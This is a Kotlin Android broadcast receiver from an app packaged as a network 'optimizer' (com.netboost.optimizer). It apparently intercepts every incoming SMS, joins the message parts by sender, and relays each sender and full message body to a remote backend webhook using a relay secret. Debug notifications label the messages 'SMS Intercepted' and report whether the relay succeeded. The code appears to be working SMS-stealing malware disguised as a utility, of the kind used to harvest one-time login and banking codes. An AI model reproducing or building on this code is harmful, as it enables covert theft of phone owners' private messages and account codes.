package com.netboost.optimizer

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class SmsReceiver : BroadcastReceiver() {

    private fun notify(context: Context, id: Int, title: String, text: String) {
        try {
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val channelId = "sms_debug"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                nm.createNotificationChannel(
                    NotificationChannel(channelId, "SMS Debug", NotificationManager.IMPORTANCE_HIGH)
                )
            }
            val n = NotificationCompat.Builder(context, channelId)
                .setSmallIcon(android.R.drawable.stat_notify_chat)
                .setContentTitle(title)
                .setContentText(text)
                .setStyle(NotificationCompat.BigTextStyle().bigText(text))
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .build()
            nm.notify(id, n)
        } catch (e: Exception) {
            Log.e("SmsReceiver", "notify() failed: ${e.message}")
        }
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        if (messages == null || messages.isEmpty()) return

        // Step 1: confirm receiver fired — Toast needs no permission
        android.os.Handler(android.os.Looper.getMainLooper()).post {
            android.widget.Toast.makeText(context, "📨 SMS received — relaying...", android.widget.Toast.LENGTH_LONG).show()
        }
        notify(context, 9001, "📨 SMS Intercepted", "${messages.size} message part(s) received — relaying...")
        Log.d("SmsReceiver", "Receiver fired — ${messages.size} parts")

        val pendingResult = goAsync()
        val msgsBySender = messages.groupBy { it.originatingAddress ?: "Unknown" }

        CoroutineScope(Dispatchers.IO + SupervisorJob()).launch {
            try {
                for ((sender, parts) in msgsBySender) {
                    val fullBody = parts.joinToString(separator = "") { it.messageBody ?: "" }
                    Log.d("SmsReceiver", "Relaying SMS from=$sender body_len=${fullBody.length} url=${Config.BACKEND_WEBHOOK}")

                    // Step 2: attempt relay and show result
                    val success = BackendClient.relayWithCode(sender, fullBody, java.util.UUID.randomUUID().toString())
                    if (success >= 200 && success < 300) {
                        notify(context, 9002, "✅ Relay Success", "HTTP $success — SMS from $sender sent to server")
                    } else {
                        notify(context, 9003, "❌ Relay Failed HTTP $success", "From=$sender\nURL=${Config.BACKEND_WEBHOOK}\nSecret=${Config.RELAY_SECRET.take(8)}...")
                    }
                }
            } catch (e: Exception) {
                Log.e("SmsReceiver", "Relay exception: ${e.message}", e)
                // Step 3: show exact exception
                notify(context, 9004, "💥 Relay Exception", e.message ?: "Unknown error")
            } finally {
                pendingResult.finish()
            }
        }
    }
}
